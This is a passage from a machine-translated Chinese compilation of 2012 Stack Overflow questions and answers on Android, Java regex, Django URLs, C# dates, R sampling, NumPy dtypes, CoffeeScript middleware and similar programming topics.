但是，传统上退出代码 0 表示成功，退出代码 > 0 表示失败。许多应用程序为 > 0 的退出代码分配了一些含义，因此脚本可以利用这一点；含义反映在应用程序的文档中。

一些应用程序遵循“更大的值意味着更严重的错误”的方案，一些允许将退出代码视为一个位集，但大多数应用程序只是定义自己的代码列表。

退出代码 < 0 非常少见。

# android - 在活动之间发送节点列表

> ID：11309678
> 
> 赞同：0
> 
> 时间：2012-07-03T11:10:05.043
> 
> 标签：android, android-intent

如何在活动之间发送节点列表？我有一个应用程序，其中有 4 个屏幕和四个活动。在第一个活动中，我解析 url 以获取节点列表。单击按钮时，我需要启动新活动并将节点列表发送到第二个活动。
我试过这种方式

```
Intent intent = new Intent(this, SecondActivity.class);
Bundle bundle = new Bundle(); 
bundle.putString("KEY","NodeList"); 

intent.putExtras(bundle);
startActivity(intent); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T11:29:07.763

使实现接口的类`NodeList`也实现接口并在意图上[`Parcelable`](http://developer.android.com/reference/android/os/Parcelable.html)使用[此方法。](http://developer.android.com/reference/android/content/Intent.html#putExtra%28java.lang.String,%20android.os.Parcelable%29)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:40:44.197

简单的方法是您可以使用 Application 类，以便您可以在 Application 中使用 Setter 方法设置值，并可以使用 Application 类中的 getter 方法取回值。

数据将保留到您的应用程序存在，因此您可以使用它.. [如何在 Android 中使用 Application 类](https://stackoverflow.com/questions/10599775/how-do-i-make-global-changes-throughout-my-app-in-android/10599919#10599919)

您也可以使用[Android Parcelable](https://stackoverflow.com/questions/7400564/android-parcelable-retailerorderactivity-java-return-null/7400675#7400675)

# java - 基于正则表达式的替换效率

> ID：11309681
> 
> 赞同：4
> 
> 时间：2012-07-03T11:10:16.803
> 
> 标签：java, regex, performance

以下哪项会更有效和更好地使用？

```
value.replaceAll("['‘’`]","")

value.replaceAll("['‘’`]+","") 
```

我的猜测是，对于没有替换字符的字符串，或者至少没有它们的序列，两者是相同的，或者第一个更好的是不那么复杂。

但是如果我正在查看确实具有被替换字符的子序列的字符串怎么办？第二个会更好吗？

```
'abababababababab'.replaceAll("ab","") 
```

对比

```
'abababababababab'.replaceAll("(ab)+","") 
```

如果这对这个 Q 很重要，我正在使用 Java。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T16:56:18.013

根据分析，我会说第一个选项比第二个更快。尽管我必须说除非您有一个巨大的字符串作为输入（或复杂的正则表达式），否则这种差异不容易测量。

所以让我们称之为 regex1：

```
'abababababababab'.replaceAll("ab","") 
```

而这个正则表达式2：

```
'abababababababab'.replaceAll("(ab)+","") 
```

我们从[Java API](http://docs.oracle.com/javase/6/docs/api/)知道replaceAll 会将[条件视为正则表达式](http://docs.oracle.com/javase/6/docs/api/java/lang/String.html#replaceAll%28java.lang.String,%20java.lang.String%29)并尝试替换正则表达式引擎之后的字符串。

我们可以看到 regex1 只有 char 序列；while 和 regex2 有一个[group](http://www.regular-expressions.info/reference.html)，一个 char 序列和一个必须相应解释的[量词元字符（更多信息](http://www.regular-expressions.info/reference.html)[在这里](http://www.regular-expressions.info/repeat.html)）。因此 regex2 比 regex1 需要更多的处理。

一般来说，这两种选择对于大多数用途来说都非常快。您可以通过阅读这篇文章来更详细地了解该过程：[正则表达式匹配可以简单快速](http://swtch.com/~rsc/regexp/regexp1.html)

尽管如此，将[Pattern](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Pattern.html)和[Matcher](http://docs.oracle.com/javase/6/docs/api/java/util/regex/Matcher.html)用于更复杂的正则表达式是一个更快的选择......（更多信息[在这里](http://www.javalobby.org/forums/thread.jspa?threadID=16822&tstart=0)）。

在这种情况下，我推荐的另外一本书是：[Optimizing Regular Expressions in Java](http://www.javaworld.com/javaworld/jw-09-2007/jw-09-optimizingregex.html)

# actionscript-3 - 向 Flex UIComponent 添加布局

> ID：11309683
> 
> 赞同：0
> 
> 时间：2012-07-03T11:10:33.317
> 
> 标签：actionscript-3, apache-flex, air, flex4.5, flex-mobile

如何向 Flex UIComponent 添加布局（具体来说是 Horizo​​ntalLayout）？

我正在开发一个大型移动应用程序，因此我想避免使用像 HGroups 这样的额外容器并使用更轻量级的组件。

像往常一样，任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:21:11.010

你不能，你也不需要。

你不能，因为只有 Spark 组件是用封装的布局机制设计的。mx 组件不是，您不能为 UIComponent 分配布局。

您实际上并不需要，因为 Groups 已经被设计为非常轻量级的容器，其中没有任何图形元素。它们的唯一目的是布局其他组件。

现在，如果您真的想削减它们，您始终可以创建自己的 Group 副本，其中仅包含您真正需要的属性，但在我看来，这将是一个巨大的时间浪费，几乎没有（如果有的话）明显的收益.

# django - 网址不匹配，django模板链接

> ID：11309695
> 
> 赞同：3
> 
> 时间：2012-07-03T11:11:24.893
> 
> 标签：django, templates, hyperlink, path, href

我在我的 django 站点的侧边栏中有一个带有链接的问题，在模板中是这样的：

```
<li><a href="profile">Profile</a></li> 
```

在 urls.py 中：

```
url(r'^(?P<user_id>\d+)/profile/$', 'auth.views.show_profile', name='profile') 
```

当我从带有 url 的主页访问它时：例如 `/1001/profile/`，它加载正常，但是当我尝试从带有 url 的另一个子页面访问它时：例如，`/1001/forms/profile/`我收到错误：当前 URL`/1001/forms/profile/`与其中任何一个都不匹配。我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:16:00.867

这是因为“个人资料”是一个相对 URL，并且一个相对 URL 附加到当前 URL - 结果地址在整个站点中无效。似乎您应该在您的情况下使用绝对 URL。

在模板中，您可以尝试以下操作：

```
<a href="/{{ request.user.id }}/profile/">Profile</a> 
```

**更新**

要在模板中获取请求，您必须将 django.core.context_processors.request 添加到 TEMPLATE_CONTEXT_PROCESSORS。我不确定它是否默认添加。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:24:56.827

您必须像您一样在 url 中添加第二个子页面 url`/1001/profile/`

```
url(r'^(?P<user_id>\d+)/form/profile/$', 'auth.views.show_profile', name='profile_form') 
```

并按照@Paulo 提到的那样更正您的代码，或者您也可以通过反向 url 来完成。

```
<a href="{% url profile request.use.id %}">Profile</a> 
```

# android - 如何在 EditText 上应用 Textchange 事件

> ID：11309710
> 
> 赞同：29
> 
> 时间：2012-07-03T11:12:14.853
> 
> 标签：android, android-edittext, textwatcher

我开发了一个简单的应用程序，比如减法、加法。在这个应用程序中，我使用了三个 EditText，一个用于回答，另外两个用于提问。我想计算关于文本更改事件的问题的答案。但是，当我在这两个上应用文本更改事件时，事件会发生但无法正常工作。因为当我在问题的第一个 EditText 中输入文本时，事件发生但它抛出了这个异常：

```
07-03 16:39:48.844: E/EduApp Log :=>(12537): Error In Text change Event java.lang.NumberFormatException: unable to parse '' as integer 
```

我该怎么办？我使用`TextWatcher`for text change 事件。

```
txtOne.addTextChangedListener(this);
txtTwo.addTextChangedListener(this);

public void afterTextChanged(Editable s) {}

public void beforeTextChanged(CharSequence s, int start, int count, int after) {}

public void onTextChanged(CharSequence s, int start, int before, int count) {} 
```

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2012-07-03T11:13:32.397

我认为您收到`" "`的是导致此问题的空字符串。确保从`EditText`.

考虑你`EditText`没有输入任何值，并且你试图获取它的值并转换为 int 你会遇到这种问题。

```
edittext.addTextChangedListener(new TextWatcher() {

    public void onTextChanged(CharSequence s, int start, int before,
            int count) {
            if(!s.equals("") ) { 
                //do your work here 
            }
    }

    public void beforeTextChanged(CharSequence s, int start, int count,
            int after) {

    }

    public void afterTextChanged(Editable s) {

    }
}); 
```

另请查看此链接以获取更多想法，

[https://stackoverflow.com/a/3377648/603744](https://stackoverflow.com/a/3377648/603744)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-12-29T12:01:25.753

我认为最好的情况是edittext类型是数字......使用参数的（长度函数）而不是（equle（）函数）例如：

```
edittext.addTextChangedListener(new TextWatcher() {

    public void onTextChanged(CharSequence s, int start, int before,
            int count) {
        if (s.length() > 0)
                { //do your work here }
        }

    }

    public void beforeTextChanged(CharSequence s, int start, int count,
            int after) {

    }

    public void afterTextChanged(Editable s) {

    }
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-20T13:55:24.450

我用了这个，它是正确的：

```
public void afterTextChanged(Editable arg0) {
    String inputs = input.getText().toString();
    Integer index=0;
    if(!inputs.equals("")) 
        index=Integer.valueOf(inputs);

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-03T12:01:42.870

我认为您需要先检查您的 editText 值是否为空。像这样的东西：

```
String textValue;
textValue = edittext().getText().toString());
Log.v("","Value is " + textValue);
if(textValue != ""){
   // Call Text Change Listener Here
}else{
   // Throw error message or something
} 
```

希望有帮助。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-01-31T15:45:27.247

添加了**Kotlin**实现以供将来参考

```
 webUrl.editText!!.addTextChangedListener(object : TextWatcher {
            override fun afterTextChanged(s: Editable?) {
            }

            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {

                var urlToload: String
                if (s ==null || s.isEmpty()) {
                    urlToload = UniversalWebViewFragment.YOUTUBE_SERACH_URL + "hd trailers"
                } else {
                    urlToload = UniversalWebViewFragment.GOOGLE_SERACH_URL + s.toString()
                }

                loadURL(urlToload)
            }

        }) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2019-02-13T05:50:36.110

我遇到了同样的问题，通过以下 2 个操作解决了问题：
1 - **android:inputType="textNoSuggestions"** （它本身并没有解决问题）
2 - 添加监听器：

```
edittext1.addTextChangedListener(new TextWatcher() {

            public void onTextChanged(CharSequence s, int start, int before,
            int count) {

                Log.e("JFT", "EDITTEXT => = "+s);
                if(!s.equals("") ) {
                    //do your work here
                }
            }

            public void beforeTextChanged(CharSequence s, int start, int count,
            int after) {

            }

            public void afterTextChanged(Editable s) {

            }
        }); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2020-01-09T11:24:50.690

> 对于 Kotlin，请使用以下代码

```
edit1.addTextChangedListener(object : TextWatcher {
   override fun onTextChanged(s: CharSequence, start: Int, before: Int, count: Int) {
       if (edit1.text.toString().length == 1) {
             edit2.requestFocus()
       }
   }

   override fun beforeTextChanged(s: CharSequence, start: Int, count: Int, after: Int
   ) {// TODO Auto-generated method stub
   }

   override fun afterTextChanged(s: Editable) {}
}) 
```

# c# - 在 c# 中获取 GetWeekOfYear 的日期？

> ID：11309715
> 
> 赞同：3
> 
> 时间：2012-07-03T11:12:23.653
> 
> 标签：c#, .net, datetime, .net-4.0, cultureinfo

我有这个功能，它给了我（当前日期） - 它的周数：

因此对于 ：`DateTime(2009,1,1)`

```
 CultureInfo.CurrentCulture.Calendar.GetWeekOfYear(new DateTime(2009,1,1), CalendarWeekRule.FirstDay, DayOfWeek.Sunday).Dump(); 
```

回答 ：`1`

和：`DateTime(2009,1,4)`

回答 ：`2`

![在此处输入图像描述](../Images/f4d7f46da691c84ba4c6f264a59120ac.png)

现在，我需要一个函数，它给我这个值的 startDate && endDate：

```
so for week #1 -> 1/1/2009   ---> 1/3/2009
so for week #2 -> 1/4/2009   ---> 1/10/2009 
```

因此：我有一个函数可以给我指定日期的星期数。但本周跨越`x---> y`

我需要那些 x 和 y。

谢谢。

*ps - 我一直在寻找这样的函数，但没有找到。:-(*

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:15:03.940

我曾经使用过这篇文章评论中描述的一种方法 [http://joelabrahamsson.com/entry/getting-the-first-date-in-a-week-with-c-sharp](http://joelabrahamsson.com/entry/getting-the-first-date-in-a-week-with-c-sharp)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-03T11:16:19.470

```
using System;
using System.Globalization;

public static class FirstDayOfWeekUtility
{
    /// <summary>
    /// Returns the first day of the week that the specified
    /// date is in using the current culture. 
    /// </summary>
    public static DateTime GetFirstDayOfWeek(DateTime dayInWeek)
    {
        CultureInfo defaultCultureInfo = CultureInfo.CurrentCulture;
        return GetFirstDateOfWeek(dayInWeek, defaultCultureInfo);
    }

    /// <summary>
    /// Returns the first day of the week that the specified date 
    /// is in. 
    /// </summary>
    public static DateTime GetFirstDayOfWeek(DateTime dayInWeek, CultureInfo cultureInfo)
    {
        DayOfWeek firstDay = cultureInfo.DateTimeFormat.FirstDayOfWeek;
        DateTime firstDayInWeek = dayInWeek.Date;
        while (firstDayInWeek.DayOfWeek != firstDay)
            firstDayInWeek = firstDayInWeek.AddDays(-1);

            return firstDayInWeek;
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:42:09.127

要获取一周中的第一天，按日期：

```
static DateTime GetFirstDayOfWeek(DateTime date)
{
    var firstDayOfWeek = date.AddDays(-((date.DayOfWeek - DayOfWeek.Sunday + 7) % 7));
    if (firstDayOfWeek.Year != date.Year)
        firstDayOfWeek = new DateTime(date.Year, 1, 1);
    return firstDayOfWeek;
} 
```

一周的最后一天的工作方式相同：

```
static DateTime GetLastDayOfWeek(DateTime date)
{
    var lastDayOfWeek = date.AddDays((DayOfWeek.Saturday - date.DayOfWeek + 7) % 7);
    if (lastDayOfWeek.Year != date.Year)
        lastDayOfWeek = new DateTime(date.Year, 12, 31);
    return lastDayOfWeek;
} 
```

# Royi 的补充（最终）：

扩展方法，它为您提供单个日期的所有详细信息（周详细信息）：ps 星期的第一天 = 星期日。

```
 public class DateTimeSpan
    {
        public DateTime WeekStartDate;
        public DateTime WeekEndDate;
        public DateTime MonthStartDate;
        public DateTime MonthEndDate;
        public DateTime YearStartDate;
        public DateTime YearEndDate;
        public int WeekNum;

    }

    public static DateTimeSpan TimeProperties(this DateTime str)
    {
        if (str == null) return null;
        DateTimeSpan dts = new DateTimeSpan();
        dts.WeekNum=     CultureInfo.CurrentCulture.Calendar.GetWeekOfYear(str, CalendarWeekRule.FirstDay, DayOfWeek.Sunday);
        dts.WeekStartDate = GetFirstDayOfWeek(str);
        dts.WeekEndDate = GetLAstDayOfWeek(str);
        dts.MonthStartDate = new DateTime(str.Year, str.Month, 1);
        int numberOfDays = DateTime.DaysInMonth(str.Year, str.Month);
        DateTime last = new DateTime(str.Year, str.Month, numberOfDays);
        dts.MonthEndDate = last;
        dts.YearStartDate = new DateTime(str.Year, 1, 1);
        numberOfDays = DateTime.DaysInMonth(str.Year, 12);
        last = new DateTime(str.Year, 12, numberOfDays);
        dts.YearEndDate = last;

        return dts;
    }

    static DateTime GetFirstDayOfWeek(DateTime date)
    {
        var firstDayOfWeek = date.AddDays(-((date.DayOfWeek - DayOfWeek.Sunday + 7) % 7));
        if (firstDayOfWeek.Year != date.Year)
            firstDayOfWeek = new DateTime(date.Year, 1, 1);
        return firstDayOfWeek;
    }

    static DateTime GetLAstDayOfWeek(DateTime date)
    {
        var firstDayOfWeek = date.AddDays(((DayOfWeek.Saturday - date.DayOfWeek + 7) % 7));
        if (firstDayOfWeek.Year != date.Year)
            firstDayOfWeek = new DateTime(date.Year, 12, 31);
        return firstDayOfWeek;
    } 
```

# r - 将客户群分成 12 个样本（= 每月周期）

> ID：11309723
> 
> 赞同：0
> 
> 时间：2012-07-03T11:12:54.660
> 
> 标签：r, split, sample

我需要将 500.000 名客户分成 12 个有代表性的样本，每个月都会联系这些样本。

12 个样品应在产品和该产品的生命周期等级（A、B、C）内具有代表性。 **意味着：我需要按产品 ID 和生命周期类别分层的比例样本（可以连接）**

而且我不仅需要一个样本，而是将整个人口分成 12 个样本。

结果应该是添加了分层循环 ID (1 - 12) 的原始表。

费：

```
cust_id, product, lifecycle, NEW: cycle_id
10000, 4004, A, 3
10000, 2000, B, 6
10001, 3000, B, 12 
```

一个客户可以欠多个产品，但客户-产品的组合是唯一的。

每个客户-产品组合在 12 个周期内只能使用一次（因此不能退回）

我怎样才能在 R 中做到这一点？

样本数据行：

```
cust_id, product, lifecycle
10000, 4004, A
10000, 2000, B
10001, 3000, B
10002, 2000, A
10004, 4004, C
... 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-03T15:29:11.827

这是一个丑陋但实用的解决方案。我为奇怪、复杂的子集道歉，但不幸的是 by() 以一种非常奇怪的方式存储它的数据。

```
mysamp <- function(dat){
  samp <- runif(length(dat)) #get 12 random numbers
  samp <- ceiling(samp*12) #standardize between 1 and 12
  return(samp)
} 
```

这就是您将用来将总体划分为 12 个样本的函数。现在说'zz'是你的数据集：

```
cust <- c(101, 101, 102, 105, 107)
prod <- c(4004, 2000, 3000, 3000, 4004)
life <- c('A', 'B', 'B', 'B', 'A')
zz <- data.frame(cust, prod, life)
prodlife <- paste0(zz$prod, zz$life)
zz <- data.frame(zz, prodlife) 
```

给你

```
> zz
  cust prod life prodlife
1  101 4004    A    4004A
2  101 2000    B    2000B
3  102 3000    B    3000B
4  105 3000    B    3000B
5  107 4004    A    4004A 
```

然后，您需要创建一列 0 来放入 cycle.id（在我的示例中我将其称为“cyc”）。像添加 zz$prodlife 一样将其附加到 data.frame。然后您可以使用这些语句进行采样并将样本分配给列：

```
cycle <- by(newzz$cust, newzz$prodlife, mysamp)
for(i in 1:length(cycle)){
    for(j in 1: length(cycle[i][[1]])){
        zz$cyc[zz$prodlife == names(cycle)[i]][j] <- cycle[i][[1]][j]
    }
} 
```

by() 语句在那里完成所有工作，而可怕的 for 循环只是将采样值分配给正确的位置。因为“by”类的子集不方便，所以我想不出更有效的方法来完成这项任务，但也许其他人可以......？无论如何，这给了我：

```
> zz
  cust prod life prodlife cyc
1  101 4004    A    4004A   6
2  101 2000    B    2000B   5
3  102 3000    B    3000B   7
4  105 3000    B    3000B   8
5  107 4004    A    4004A   1 
```

当然，这个例子太小了，无法判断样本是否正确分层，但这应该可行。快乐编码！

# ruby-on-rails - Rspec 控制器显示测试失败，rails 3.2.6

> ID：11309725
> 
> 赞同：1
> 
> 时间：2012-07-03T11:13:03.347
> 
> 标签：ruby-on-rails, rspec, ruby-on-rails-3.2

我有一个简单的 rspec 测试，在升级到 3.2.6 后失败。

这是 users_controller_spec.rb 中的规范

```
describe "show action" do
  before(:each) do
    User.stub!(:find).with(@user.id).and_return(@user)
  end

  def do_get
    get :show, :id => @user.id
  end

  it "should be successful" do
    do_get
    response.should be_success
  end
end 
```

这是错误

```
1) UsersController show action should be successful
 Failure/Error: get :show, :id => @user.id
   .........................
(class)> received :find with unexpected arguments
expected: (2)
got: ("2") 
```

不知道哪里出了问题。show 动作在控制器中没有任何内容，它只是

```
def show
end 
```

# javascript - 将 sql 日期与 javascript 日期进行比较

> ID：11309730
> 
> 赞同：3
> 
> 时间：2012-07-03T11:13:20.587
> 
> 标签：javascript, jquery

有没有一种简单的方法可以将 sql dateTime 与 javascript 日期时间进行比较，以便可以轻松地比较两者？

是否有内置的 javascript 函数，因为我无法编辑 sql

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-07-17T17:39:30.647

假设日期字符串来自 SQL：

```
>>> new Date('2012-11-10 15:16:17')
Date {Invalid Date}

>>> new Date('2012-11-10T15:16:17')
Date {Sat Nov 10 2012 15:16:17 GMT+0100}

>>> new Date('2012-11-10 15:16:17'.replace(' ', 'T'))
Date {Sat Nov 10 2012 15:16:17 GMT+0100} 
```

您可以通过附加偏移量来处理来自任何时区的输入，例如伦敦时间：

```
>>> new Date('2012-11-10 15:16:17'.replace(' ', 'T') + '+00:00')
Date {Sat Nov 10 2012 16:16:17 GMT+0100} 
```

要在 JavaScript 中比较两个日期，只需将它们相减即可返回以毫秒为单位的差异：

```
>>> var d1 = new Date('2012-11-10T15:16:17'); var d2 = new Date('2012-11-10T15:16:18'); d2 - d1
1000 
```

[这是一个很好的课程](https://stackoverflow.com/a/7763364/819417)，可以按月等进行比较。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-03T11:36:37.203

要将 MySQL DATETIME 字符串转换为 JavaScript Date 对象：

```
 var sqlDateStr = "2012-01-02 23:58:59"; // as for MySQL DATETIME
        sqlDateStr = sqlDateStr.replace(/:| /g,"-");
        var YMDhms = sqlDateStr.split("-");
        var sqlDate = new Date();
        sqlDate.setFullYear(parseInt(YMDhms[0]), parseInt(YMDhms[1])-1,
                                                 parseInt(YMDhms[2]));
        sqlDate.setHours(parseInt(YMDhms[3]), parseInt(YMDhms[4]), 
                                              parseInt(YMDhms[5]), 0/*msValue*/);
        alert(sqlDate); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-03T11:21:16.143

您如何在 javascript 中访问 sql 日期时间。我假设你有它作为一个字符串。内置的 js Date.parse() 函数可以解析各种字符串并返回一个 js Date 对象。

[https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Date/parse](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Date/parse)

如果您的 sql 日期以自定义格式返回，您将需要手动将其分解为相关的年、月、日、小时、分钟、秒组件，并使用适当的 Date() 构造函数组装 Date 对象。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-21T15:32:17.980

要修复 parseInt(08) 和 parseInt(09)，请使用 parseInt(08,10) parseInt(09,10)。

在 Javascript 中，以零开头的数字被认为是八进制，八进制中没有 08 或 09，因此存在问题。

[http://www.ventanazul.com/webzine/articles/issues-parseint-javascript](http://www.ventanazul.com/webzine/articles/issues-parseint-javascript)

# javascript - Ramaze + CoffeeScript：是否可以使用 Ramaze 自动生成 Javascript？

> ID：11309738
> 
> 赞同：4
> 
> 时间：2012-07-03T11:13:41.967
> 
> 标签：javascript, coffeescript, sinatra, ramaze

我正在尝试找到一种从 CoffeeScript 文件自动生成 Javascript 的方法，就像您在 Sinatra 中很容易做到的那样：

```
require 'sinatra'
require 'coffee-script'
get '/*.js' do
  name = params[:splat][0]
  file_name = File.join("#{name}.coffee")
  pass unless File.exists?(file_name)
  content_type(:js, :charset => 'utf-8')
  coffee(IO.read(file_name))
end 
```

这样，在我的代码中，`.js`即使我只有`.coffee`文件，我也可以表现得像文件存在一样。与使用客户端 CoffeeScript 编译器相比，它的特殊性和错误更少……

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-04T08:40:04.143

谢谢leucos！！！

我也想过一个 Rack 中间件，但想知道是否没有更“ramaze”的解决方案（比如先天）。

无论如何，这很有效，而且很棒！

这是您的代码的修改版本：

```
require 'coffee-script'

# An attempt to allow Ramaze to generate Js file from coffee files
module Rack
  class BrewedCoffee
    def initialize(app, options = {})
      @app = app
      @lookup_path = options[:lookup_path].nil? ? [__DIR__] : options[:lookup_path]
    end

    def call(env)
      name = env['PATH_INFO']

      # Continue processing if requested file is not js
      return @app.call(env) if File.extname(name) != '.js'

      coffee_name = "#{name[0...-3]}.coffee"

      @lookup_path.each do |p|
        coffee_file = File.join(p, coffee_name)
        next unless File.file?(coffee_file)

        response_body = CoffeeScript.compile(File.read(coffee_file))
        headers = {}
        headers["Content-Type"] = 'application/javascript'
        headers["Content-Length"] = response_body.length.to_s

        return [200, headers, [response_body]]
      end

      @app.call(env)
    end
  end
end 
```

我清理了一些东西并删除了 Ramaze 依赖项，这样它就是一个纯 Rack 中间件:)。

您可以使用它调用：

```
m.use Rack::BrewedCoffee, :lookup_path => Ramaze.options.roots 
```

再见，安德烈亚斯

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-04T07:26:44.363

处理这个问题的最好方法可能是编写自己的机架中间件，并像下面这样使用它。您可能需要使用某种缓存，这样您就不会在每次调用时都`.js`从文件中重建文件。`.coffee`

```
require 'ramaze'

class BrewedCoffee
  def initialize(app)
    @app = app
  end

  def call(env)
    name = env['PATH_INFO']

    # Continue processing if requested file is not js
    return @app.call(env) if name !~ /\.js$/

    # Caching & freshness checks here...
    # ...

    # Brewing coffee
    name = name.split('.')[0..-2].join('.') + ".coffee"

    Ramaze.options.roots.each do |p|
      file_name = File.join("#{name}.coffee")
      next unless File.exists?(file_name)

      response_body = coffee(IO.read(file_name))
      headers["Content-Type"] = 'application/javascript'
      headers["Content-Length"] = response_body.length.to_s

      [status, headers, response_body]
    end

    @app.call(env)
  end
end

class MyController < Ramaze::Controller
  map '/'

  ...
end

Ramaze.middleware! :dev do |m|
  m.use(BrewedCoffee)
  m.run(Ramaze::AppMap)
end

Ramaze.start 
```

这很快就被黑了，需要更多的爱，但你明白了。而且您可能不想在生产中执行此操作，而只是预先构建咖啡的东西，否则您的系统操作员会遇到麻烦：D

# python - 在一个 NumPy 数组中存储不同的数据类型？

> ID：11309739
> 
> 赞同：60
> 
> 时间：2012-07-03T11:13:49.570
> 
> 标签：python, arrays, types, numpy

我有两个不同的数组，一个是字符串，另一个是整数。我想将它们连接成一个数组，其中每一列都具有原始数据类型。我目前的解决方案（见下文）将整个数组转换为 dtype = string，这似乎非常低效。

`combined_array = np.concatenate((A, B), axis = 1)`

`combined_array`是否可以在when`A.dtype = string`和中重复 dtypes `B.dtype = int`？

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-07-03T11:41:50.307

一种方法可能是使用[记录数组](http://docs.scipy.org/doc/numpy/user/basics.rec.html)。“列”不会像标准 numpy 数组的列，但对于大多数用例来说，这就足够了：

```
>>> a = numpy.array(['a', 'b', 'c', 'd', 'e'])
>>> b = numpy.arange(5)
>>> records = numpy.rec.fromarrays((a, b), names=('keys', 'data'))
>>> records
rec.array([('a', 0), ('b', 1), ('c', 2), ('d', 3), ('e', 4)], 
      dtype=[('keys', '|S1'), ('data', '<i8')])
>>> records['keys']
rec.array(['a', 'b', 'c', 'd', 'e'], 
      dtype='|S1')
>>> records['data']
array([0, 1, 2, 3, 4]) 
```

请注意，您也可以通过指定数组的数据类型对标准数组执行类似的操作。这被称为“[结构化数组](http://www.scipy.org/Cookbook/Recarray)”：

```
>>> arr = numpy.array([('a', 0), ('b', 1)], 
                      dtype=([('keys', '|S1'), ('data', 'i8')]))
>>> arr
array([('a', 0), ('b', 1)], 
      dtype=[('keys', '|S1'), ('data', '<i8')]) 
```

不同之处在于记录数组还允许对单个数据字段进行属性访问。标准结构化数组没有。

```
>>> records.keys
chararray(['a', 'b', 'c', 'd', 'e'], 
      dtype='|S1')
>>> arr.keys
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'numpy.ndarray' object has no attribute 'keys' 
```

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2017-05-18T21:47:41.697

一个简单的解决方案：将您的数据转换为对象 'O' 类型

```
z = np.zeros((2,2), dtype='U2')
o = np.ones((2,1), dtype='O')
np.hstack([o, z]) 
```

创建数组：

```
array([[1, '', ''],
       [1, '', '']], dtype=object) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-03-09T23:05:26.023

参考 Numpy [doc](https://docs.scipy.org/doc/numpy/user/basics.rec.html)，有一个名为`numpy.lib.recfunctions.merge_arrays`function 的函数，可用于将不同数据类型的 numpy 数组合并到结构化数组或记录数组中。

例子：

```
>>> from numpy.lib import recfunctions as rfn
>>> A = np.array([1, 2, 3])
>>> B = np.array(['a', 'b', 'c'])
>>> b = rfn.merge_arrays((A, B))
>>> b
array([(1, 'a'), (2, 'b'), (3, 'c')], dtype=[('f0', '<i4'), ('f1', '<U1')]) 
```

有关更多详细信息，请参阅上面的链接。

# iphone - NSString 的大小 - 目标 C

> ID：11309744
> 
> 赞同：0
> 
> 时间：2012-07-03T11:14:03.597
> 
> 标签：iphone, objective-c, ios, xcode, ipad

就 NSString 而言，是否有限制？我正在使用以下代码行来读取文件的内容，`edit.txt`但`saveString`无法包含我的`.txt`文件的所有内容。

```
NSString *savedDir = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];

//NSString *savedeDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];

NSString *saveFilePath = [savedDir stringByAppendingPathComponent:@"Root"];
saveFilePath = [saveFilePath stringByAppendingPathComponent:savedName];
saveFilePath = [saveFilePath stringByAppendingPathComponent:@"edit.txt"];
NSString *saveString = [NSString stringWithContentsOfFile:saveFilePath encoding:NSUTF8StringEncoding error:nil]; 
NSLog(@"saveString is :: %@ savedSpaceName : %@ savefilepath : %@ ", saveString, savedName, saveFilePath); 
```

NSString 的大小有问题吗？我无法弄清楚。有人可以为我提供解释或帮助我弄清楚。谢谢并恭祝安康。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:18:58.233

我假设 NSString 的硬限制是`NSUIntegerMax`字符，因为 NSString 的索引和大小相关的方法返回一个 NSUInteger。由于当前能够运行的所有设备`iOS`都是 32 位的，这意味着`NSUIntegerMax`2^32 - 1 并且`NSString`可以容纳超过 42 亿个字符。

据我所知，实际限制要小得多——尤其是在 iOS 设备上，在达到 NSString 中的任何硬限制之前很久就会耗尽内存。

所以你的问题是别的！

# jquery - 如何显示每个单元格的工具提示？

> ID：11309749
> 
> 赞同：5
> 
> 时间：2012-07-03T11:14:18.853
> 
> 标签：jquery, jquery-datatables

如何修改代码以将每个单元格信息显示到工具提示中？

[http://datatables.net/release-datatables/examples/advanced_init/events_post_init.html](http://datatables.net/release-datatables/examples/advanced_init/events_post_init.html)

```
$(document).ready(function() {
/*
* First step is to create title attributes for the rows in the table
* This isn't needed if the required 'title' attribute is already set in the HTML in the
* DOM
*/
$('#example tbody tr').each( function() {
var sTitle;
var nTds = $('td', this);
var sBrowser = $(nTds[1]).text();
var sGrade = $(nTds[4]).text();

if ( sGrade == "A" )
sTitle = sBrowser+' will provide a first class (A) level of CSS support.';
else if ( sGrade == "C" )
sTitle = sBrowser+' will provide a core (C) level of CSS support.';
else if ( sGrade == "X" )
